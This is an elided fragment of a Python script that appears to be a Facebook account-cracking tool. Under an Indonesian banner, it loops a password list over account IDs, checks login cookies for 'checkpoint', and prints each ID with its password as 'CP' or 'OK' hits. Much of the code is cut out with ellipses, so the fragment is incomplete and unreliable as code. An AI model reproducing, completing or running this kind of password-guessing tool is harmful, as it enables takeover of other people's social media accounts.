...
def contact():
	os.system('xdg-open https://www.facebook.com/harryyyxd')
	back()
def animation(u):
...
☑☑░░░░░░🆆🅾🅻🅵░░░░░☑☑ 
	...
	𝙆𝙪𝙢𝙥𝙪𝙡𝙖𝙣 𝘼𝙠𝙪𝙣 𝙐𝙣𝙞𝙠 𝙄𝙣𝙙𝙤𝙣𝙚𝙨𝙞𝙖\u001b[36mv3""")
def info():
	print(f"""\033[1;37m----------------------------------------------
 Author     : B411654T
 Github     : cooming
...
def passu():
	...
	linex()
	prog = Progress(TextColumn('\033[1;97m [NEW-DIEAN]{task.description}'))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\u001b[33m [DIEAN-CP] {idf} │ {pw}\033[1;97m')
				...
				print(f'\033[1;32m [DIEAN-OK] {idf} │ {pw}\033[1;97m ')
